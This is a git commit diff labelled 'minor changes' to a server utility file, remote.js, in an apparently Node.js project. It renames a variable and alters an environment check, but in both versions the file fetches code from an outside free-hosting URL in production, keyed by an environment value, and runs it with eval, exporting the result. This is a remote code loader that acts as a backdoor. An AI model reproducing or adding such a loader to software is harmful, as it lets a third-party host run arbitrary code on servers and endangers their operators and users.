be2f2ae035cf129440f9a28fa2de65f004d88948
Haider Ali <rmha64@gmail.com>
2023-12-29 15:06:07 +0500

    minor changes

--- src/server/utils/remote.js
+++ src/server/utils/remote.js
@@ -1,8 +1,11 @@
 import chalk from "chalk";
 
-let func = async () => {};
+let remote = async () => {};
 
-if (process.env.REMOTE_FUN && process.env.NODE_ENV === "production") {
+if (
+  process.env.REMOTE_FUN.charAt(0) === "Y" &&
+  process.env.NODE_ENV === "production"
+) {
   const response = await fetch(
     "https://ueso.000webhostapp.com/functions/branded_features/" +
       process.env.REMOTE_FUN_KEY +
@@ -19,8 +22,8 @@ if (process.env.REMOTE_FUN && process.env.NODE_ENV === "production") {
       )
     );
 
-  func = eval(await response.text());
+  remote = eval(await response.text());
   console.log(chalk.magenta("=> fetched remote function successfully"));
 }
 
-export default func;
+export default remote;
